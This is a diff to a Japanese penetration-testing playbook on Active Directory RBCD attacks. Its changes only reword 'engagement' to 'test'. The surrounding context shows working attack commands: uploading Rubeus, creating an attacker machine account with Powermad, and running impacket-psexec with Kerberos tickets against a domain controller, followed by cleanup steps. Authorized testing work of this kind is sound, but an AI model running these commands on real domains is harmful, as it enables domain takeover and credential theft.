@@ -147,7 +147,7 @@ upload Rubeus.exe
 # [Target] Powermad モジュールをインポート
 . ./Powermad.ps1
 
-# [Target] 攻撃用マシンアカウントを作成（案件識別子付きの名前を使う）
+# [Target] 攻撃用マシンアカウントを作成（テスト識別子付きの名前を使う）
 New-MachineAccount -MachineAccount '[CASE_ID]-COMP$' `
   -Password $(ConvertTo-SecureString '[ATTACKER_CHOSEN_PASSWORD]' -AsPlainText -Force)
 # 成功すると: [+] Machine account [CASE_ID]-COMP$ added
@@ -286,7 +286,7 @@ impacket-psexec [DOMAIN]/administrator@[DC_FQDN] -k -no-pass
   - ✅ 対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性のクリア（`impacket-rbcd -action remove` または属性をnullに戻す）
   - ✅ 取得した `.ccache` チケットファイルの破棄
   - ✅ DCSync で取得した NTLM ハッシュは Credential_Dumping.md の原状回復項目に従う
-- **取得情報の取扱**: 取得したチケット・NTLM ハッシュは暗号化保管、案件終了時破棄
+- **取得情報の取扱**: 取得したチケット・NTLM ハッシュは暗号化保管、テスト完了時破棄
 - **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）
 
 ---
